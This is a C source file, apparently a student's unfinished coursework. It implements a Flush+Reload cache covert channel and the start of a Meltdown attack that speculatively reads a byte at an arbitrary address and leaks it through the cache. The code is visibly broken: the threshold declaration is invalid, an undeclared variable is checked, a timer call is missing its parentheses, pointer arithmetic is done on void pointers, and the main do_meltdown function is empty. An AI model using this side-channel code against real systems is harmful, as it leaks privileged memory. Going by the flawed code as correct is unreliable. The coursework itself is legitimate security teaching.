#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define u64 uint64_t
#define i64 int64_t

/*
Task 1 - Build a covert channel (30%)

The covert channel consists of four functions. The function cc_init() initializes the covert channel, 
setting up whatever memory it needs. cc_setup() sets the channel for sending a byte. 
cc_transmit(uint8_t value) transmits a value through the channel, and int cc_receive() returns the 
value it receives, or -1 if no value has been received. In the case that multiple values appear to 
have been sent, the function can arbitrarily choose which one to return.

For a channel, we will use the Flush+Reload attack. Basically, cc_init allocates space for 256 
different cache lines that the transmit function uses. cc_setup flushes these lines from the cache, 
cc_transmit accesses one of these cache lines based on the transmitted value, and cc_receive checks 
which of the cache lines is cached. To overcome prefetchers, we want each of these cache lines to 
reside in a different memory page.

Your task is to implement the four functions, test the accuracy of the covert channel, and report.
*/
void *cc_buffer;
size_t cc_buf_size = 256 * 4096; // 256 cache lines, 4096 bytes apart (mem pages)
u64 threshold 40;

static inline void maccess(void *p) {
    asm volatile("movl eax, [%0]\n" : : "c"(p) : "eax");
}
static void flush(void *p) {
    asm volatile("clflush [%0]\n" : : "c"(p) : "eax");
}

static inline u64 my_rdtsc() {
  u64 a = 0, d = 0;
  asm volatile("mfence;rdtscp;mfence;" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  return a;
}

static void flush_buf(){
    for (int i=0; i<cc_buf_size/4096;i++){
        flush(&cc_buffer[i*512]);
    }
}


void cc_init() {
	// Implement
	// allocate 256 different cache lines on differenz mem pages
	cc_buffer = mmap(NULL, cc_buf_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	if (ptr == MAP_FAILED) {
        perror("cc_init: mmap failed");
        return;
	}
}

// cc_setup() sets the channel for sending a byte. 
void cc_setup() {
    memset(cc_buffer, 0xaa, cc_buf_size); // write something -> avoid null page
    flush_buf();
}

// cc_transmit(uint8_t value) transmits a value through the channel
void cc_transmit(uint8_t value) {
    maccess(&cc_buffer[value*512]);
}

// int cc_receive() returns the value it receives, or -1 if no value has been received
int cc_receive() {
    u64 time;
    void *cur_adrs;
    for (int i=0; i<cc_buf_size/4096;i++){
        cur_adrs=&cc_buffer[i*512];
        time = my_rdtsc();
        maccess(cur_adrs);
        time = my_rdtsc - time;
        flush(cur_adrs);
        if (time<threshold) return i;
    }
    return -1;
  // Implement
}

// --------------------------------------------------

void meltdown(uintptr_t adrs) {
  volatile int tmp = 0;
  cc_setup();
  _mm_lfence();
  tmp += 17;
  tmp *= 59;
  uint8_t rv = *((uint8_t *)adrs);
  cc_transmit(rv);
}




int do_meltdown(uintptr_t adrs) {
  // Implement
}

